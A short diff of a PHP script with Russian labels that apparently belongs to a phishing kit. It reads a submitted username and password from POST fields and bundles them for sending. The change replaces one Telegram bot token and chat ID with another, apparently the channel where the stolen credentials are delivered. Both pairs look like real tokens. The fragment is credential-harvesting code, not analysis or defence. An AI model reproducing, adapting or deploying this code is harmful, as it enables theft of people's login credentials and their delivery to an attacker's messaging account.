@@ -5,8 +5,8 @@
 
 $name = $_POST['idi'];
 $pass = $_POST['bek'];
-$token = "5828024476:AAHdpnIAt6JqsB0z07jlVotIfHPy29E-MR0";
-$chat_id = "-880064761";
+$token = "5900916920:AAFzq5OQ50rYMYtCNeqibPW_MTrI7IvP6jw";
+$chat_id = "-821200456";
 $arr = array(
   'Имя пользователя: ' => $name,
   'Пароль: ' => $pass
